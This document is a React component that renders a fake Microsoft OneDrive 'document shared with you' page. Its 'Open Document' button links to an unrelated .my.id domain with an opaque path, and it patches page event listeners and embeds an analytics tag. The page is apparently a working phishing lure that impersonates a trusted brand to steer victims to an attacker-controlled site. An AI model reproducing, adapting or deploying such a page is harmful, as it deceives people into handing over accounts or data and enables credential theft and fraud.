import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}

    try {
      
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');

    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      

<header className="w-full px-6 lg:px-8 py-6 flex items-center justify-start border-b border-slate-100">
<div className="text-[#0078D4] font-semibold text-lg tracking-tighter">
            ONEDRIVE
        </div>
</header>

<main className="flex-1 flex flex-col items-center justify-center p-6 lg:p-8">
<div className="max-w-lg w-full flex flex-col items-center text-center space-y-8">

<div className="w-16 h-16 bg-slate-50 border border-slate-100 rounded-2xl flex items-center justify-center text-slate-600 shadow-sm">
<iconify-icon height="32" icon="solar:document-text-linear" style={{strokeWidth: `1.5`}} width="32"></iconify-icon>
</div>

<div className="space-y-3">
<h1 className="text-2xl sm:text-3xl font-medium tracking-tight text-slate-900 leading-tight">
                    You have received a new document to review.
                </h1>
<p className="text-sm text-slate-500">
                    This file has been securely shared with you.
                </p>
</div>

<div className="pt-4 w-full sm:w-auto">
<a className="group relative inline-flex w-full sm:w-auto items-center justify-center gap-2 h-11 px-8 text-sm font-medium text-white bg-[#0078D4] rounded-full overflow-hidden transition-all hover:bg-[#006CBE] hover:shadow-md focus:outline-none focus:ring-2 focus:ring-[#0078D4] focus:ring-offset-2" href="https://zeadroomou.my.id/XA!0SMC4vJ5R26gMDE777zm/">
<span>Open Document</span>
<iconify-icon className="transition-transform group-hover:translate-x-0.5" height="18" icon="solar:arrow-right-linear" style={{strokeWidth: `1.5`}} width="18"></iconify-icon>
</a>
</div>
</div>
</main>

<footer className="w-full px-6 py-8 flex items-center justify-center text-center">
<p className="text-xs text-slate-400 flex items-center gap-1.5">
<iconify-icon height="14" icon="solar:shield-check-linear" style={{strokeWidth: `1.5`}} width="14"></iconify-icon>
            Encrypted and secure
        </p>
</footer>

    </>
  );
}
